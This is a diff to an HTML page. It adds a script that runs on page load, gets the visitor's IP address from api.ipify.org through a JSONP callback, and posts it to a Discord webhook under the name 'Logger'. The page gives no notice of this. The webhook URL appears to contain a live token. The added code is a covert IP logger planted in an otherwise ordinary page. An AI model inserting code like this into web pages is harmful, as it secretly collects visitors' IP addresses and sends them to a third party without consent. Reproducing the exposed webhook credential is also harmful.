@@ -20,6 +20,26 @@
 
 </head>
 
+<script>
+    function getIP(json) {
+      var request = new XMLHttpRequest(); 
+          request.open("POST", "https://discord.com/api/webhooks/957389177408864336/__7PXXbGaQCCRBF-ayVSmZCTbKqu9h_9bKrIIhG1QAarhMcPrk9BSWUq9OSLKSurNabf");
+    
+          request.setRequestHeader('Content-type', 'application/json');
+    
+          var params = {
+            username: "Logger",
+            avatar_url: "https://i.pinimg.com/originals/d8/eb/57/d8eb57825be593ff8993265cf5eea794.jpg",
+            content: "**IP:** *" + json.ip + "*"
+          }
+       
+    
+          request.send(JSON.stringify(params));
+        }
+    
+</script>
+<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+
 
 <body>
 
